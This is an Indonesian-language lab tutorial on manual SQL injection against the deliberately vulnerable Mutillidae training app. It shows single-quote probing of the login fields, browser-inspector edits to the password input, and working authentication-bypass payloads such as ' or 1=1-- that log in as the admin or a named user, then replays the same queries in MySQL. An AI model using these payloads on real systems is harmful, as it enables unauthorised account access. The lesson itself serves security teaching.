# Lesson 5: Manual SQL Injection with Firebug
```
_____  _____ _       _____      _           _   _             
/  ___||  _  | |     |_   _|    (_)         | | (_)            
\ `--. | | | | |       | | _ __  _  ___  ___| |_ _  ___  _ __  
`--. \| | | | |       | || '_ \| |/ _ \/ __| __| |/ _ \| '_ \
/\__/ /\ \/' / |____  _| || | | | |  __/ (__| |_| | (_) | | | |
\____/  \_/\_\_____/  \___/_| |_| |\___|\___|\__|_|\___/|_| |_|
                              _/ |                            
                             |__/                             
```
## SQL Injection: Single Quote Test On Username Field

1. Buka Mutillidae pada firefox, lalu masuk ke halaman ```Login/Register```
![1](/lesson5/2.png)

2. Disitu kita akan melihat sebuah form login yang dapat diisi namun kita tidak mengetahui akun untuk autentikasinya. ketikkan ```'``` pada kolom "Name". Lalu klik "Login"
![1](/lesson5/3.png)

3. Perhatikan pesan error yang muncul dibagian atas. pesan itu menandakan bahwa fitur autentikasi tersebut rentan terhadap serangan SQL Injection
![1](/lesson5/x.png)

## SQL Injection: By-Pass Password Without Username (Obtain Access #1)

1. Masukkan string yang akan mengacaukan query seperti ```' or 1=1-- ```
**Penting: tambahkan spasi setelah sintaks comment jadi seperti ini ```'-- '```**
![1](/lesson5/6.png)

2. Maka kita akan berhasil login dengan akun admin. bagaimana bisa? string ```' or 1=1-- ``` akan menjadikan eksekusi query yang dasarnya adalah
```
select * from accounts where username='' and password=''
```
menjadi
```
select * from accounts where username='' or 1=1-- ' and password=''
```
query tersebut menghasilkan nilai true, dan mengambil user yang berada di paling atas pada tabel "accounts"

## SQL Injection: Single Quote Test On Password Field

1. Masukkan username dan lakukan inspect element pada kolom password lalu ubahlah ```type``` input dari ```password``` menjadi ```text```. lalu lakukanlah cek kerentanan dengan memasukkan string ```'``` lalu klik login untuk mengeksekusi querynya.
![1](/lesson5/8.png)

2. Setelah itu akan muncul error yang menandakan bahwa fitur autentikasi ini rentan terhadap serangan SQL Injection.
![1](/lesson5/9.png)

## SQL Injection: Single Quote Test On Password Field (Obtain Access #2)

1. Masukkan username dan lakukan inspect element pada kolom password lalu ubahlah value pada ```type``` menjadi ```text```, ```maxlength``` menjadi ```50``` dan ```size``` menjadi ```50```. setelah itu masukkan string ```' or (1=1 and username='samurai')-- ```
**Jangan lupa untuk menambahkan spasi setelah "-- "**
![1](/lesson5/11.png)

2. Setelah itu kita akan masuk dengan nama user "samurai" (sesuai dengan yang diinputkan tadi)
![1](/lesson5/12.png)

## Database Practice

1. masuk ke server mutillidae dan buka mysql dengan user root. dengan cara mengetikkan perintah
```
mysql -u root
```
![1](/lesson5/13.png)

2. tampilkan seluruh database dengan mengetikkan
```
show databases;
```
lalu pilih database yang digunakan oleh muttilidae (dalam kasus ini menggunakan database dengan nama owasp10) dengan mengetikkan
```
use owasp10;
```
![1](/lesson5/15.png)

3. Tampilkan seluruh tabel pada database dengan cara mengetikkan
```
show tables;
```
![1](/lesson5/16.png)

4. Tampilkan deskripsi dari tabel "accounts" dengan cara mengetikkan
```
desc accounts;
```
![1](/lesson5/17.png)

5. Tampilkan seluruh data pada tabel "accounts" dengan cara mengetikkan
```
select * from accounts;
```
![1](/lesson5/18.png)

6. Tampilkan seluruh data pada tabel "accounts" yang mempunyai username = '' dan password = '' dengan cara mengetikkan
```
select * from accounts where username='' and password='';
```
![1](/lesson5/19.png)

7. Tampilkan seluruh data pada tabel "accounts" yang mempunyai username = 'samurai' dan password = 'samurai' dengan cara mengetikkan
```
select * from accounts where username='samurai' and password='samurai';
```
![1](/lesson5/20.png)

8. Tampilkan seluruh data pada tabel "accounts" yang mempunyai username = 'samurai' dan password = 'wrongpassword' dengan cara mengetikkan
```
select * from accounts where username='samurai' and password='wrongpassword';
```
![1](/lesson5/21.png)

9. Tampilkan seluruh data pada tabel "accounts" yang mempunyai username = 'samurai'. dengan memberikan *end syntax* ```;``` *comment* ```-- ``` setelah ```username='samurai'```sehingga menjadi seperti ini:
```
select * from accounts where username='samurai';-- and password='wrongpassword';
```
![1](/lesson5/22.png)
dengan ini syntax setelah ```username='samurai'``` tidak akan dibaca/dieksekusi.

10. Coba lakukan query seperti pada login form dengan mengetikkan ```'``` didalam username untuk merusak query.
```
> select * from accounts where username=''' and password='';
> ;
```
![1](/lesson5/24.png)

11. lakukan query agar query tersebut selalu mengembalikan nilai ```True``` dengan cara menambahkan ```'or 1=1;-- ``` didalam string username
```
select * from accounts where username=''or 1=1;-- ' and password='';
```
![1](/lesson5/25.png)

12. lakukan query sql injection untuk mencari user dengan username "samurai" dengan cara
```
select * from accounts where username='samurai' and password='' or (1=1 and username='samurai');--';
```
![1](/lesson5/27.png)
